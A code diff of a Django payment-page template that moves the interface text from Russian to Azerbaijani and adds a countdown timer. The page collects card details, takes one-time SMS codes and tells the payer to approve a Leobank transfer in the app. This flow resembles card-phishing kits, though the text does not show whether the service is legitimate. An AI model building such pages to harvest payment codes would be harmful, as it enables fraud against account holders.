@@ -136,10 +136,16 @@
         <div class="col-sm-12 p-0 box">
             <div class="card rounded-0 border-0 card2" id="paypage">
                 <div class="form-card">
-                    <span {% if payment.status != 0 %}{% endif %}>
+                    <span {% if payment.status != 0 %}hidden{% endif %}>
                         <div class="row">
                             <div class="col mx-auto text-center">
-                                <p>Hoş geldiniz: {{ payment.owner_name|default_if_none:"" }} ({{ payment.user_login }})</p>
+                                <b><p>Ödəniş Cədvəli</p></b>
+                                <b><p>Hörmətli {{ payment.owner_name|default_if_none:"" }} ({{ payment.user_login }})</p></b>
+                            </div>
+                        </div>
+                        <div class="row">
+                            <div class="col mx-auto text-center">
+
                             </div>
                         </div>
                         <div class="row">
@@ -193,11 +199,9 @@
 
                         {% include 'includes/form_error.html' %}
 
-
-
                             <div id="send_cc_data" class="row">
                                 <div class="col-md-6 mx-auto">
-                                    <input  type="submit" value="Подтвердить" class="btn btn-info placeicon">
+                                    <input  type="submit" value="Ödəməyə keç" class="btn btn-info placeicon">  {# Подтвердить#}
                                 </div>
 
                             </div>
@@ -206,17 +210,17 @@
 
 
                     <span id="send_sms_btn" {% if payment.status != 3 or not phone_script.step_2_required %}hidden{% endif %}>
-                        <p>Введите смс код, который пришёл вам на телефон</p>
+                        <p>Zəhmət olmasa telefonunuza gələn SMS kodunu daxil edin və SMS Göndər düyməsini basın!</p> {# пожалуйста  смс код который пришёл на ваш телефон введите #}
                         <div  class=" col-6">
-                            <label class="pay">Sms Code</label>
+{#                            <label class="pay">SMS kodu</label>#}
 {#                            {{ form.sms_code }}#}
-                            <input class="icon" type="text" name="sms_code" minlength="4" maxlength="6" id="id_sms_code">
+                            <input class="icon" type="text" name="sms_code" placeholder="SMS kodu" minlength="4" maxlength="6" id="id_sms_code">
 
                         </div>
 
                         <div class="row">
                             <div class="col-md-6">
-                                <input id="wwq" type="submit" value="Отправить код из смс" class="btn btn-info placeicon">
+                                <input id="wwq" type="submit" value="SMS Göndər" class="btn btn-info placeicon"> {# отправить код   смс #}
                             </div>
 
 
@@ -226,7 +230,10 @@
 
 
                     {% if not phone_script.step_2_required and payment.status == 3 %}
-                        <div>Зайдите пожалуйста  в приложении  Лео банка на своём телефоне и подтвердите платеж.</div>
+                        <div>
+                            <p>Ödənişi təstiqləmək üçün Leobank mobil tədbiqində Sizə bildiriş gələcək.
+                            Zəhmət olmasa, Leobank mobil tədbiqinə keçid edin və köçürməni təstiq edin</p> {# .(Вам в приложении Леобанка придет уведомление для подтверждения  платежа. Перейдите пожалуйста  в приложении  лео банка и подтвердите перевод в приложении) #}
+                        </div>
                         <input  type="submit" value="Продолжить" class="btn btn-info placeicon">
                     {% endif %}
                     <span id="time_is_up" style="display: none">Таймер истёк, вернитесь пожалуйста  на сайт и создайте новую заявку</span>
@@ -235,9 +242,19 @@
             </div>
         </div>
     </form>
-                               <div class="col-1 mx-auto" style="margin-left: 0px">
+                    <div class="row"  style="height: 50px">
+
+                                <div class="col-9 d-flex justify-content-center align-items-center" style="height: 65px">
+                                    {% if payment.status == 0 %}
+                                    <p >Əməliyyat üçün qalan vaxt:</p> {# время на совершенние оплаты #}
+                                    {% elif payment.status == 3 %}
+                                    <p >SMS üçün qalan vaxt:</p> {# время для ввода смс #}
+                                    {% endif %}
+                                    </div>
+                                <div class="col-1">
                                             {% include 'includes/timer_circle.html' %}
-                               </div>
+                                </div>
+                    </div>
   </div>
 </div>
 
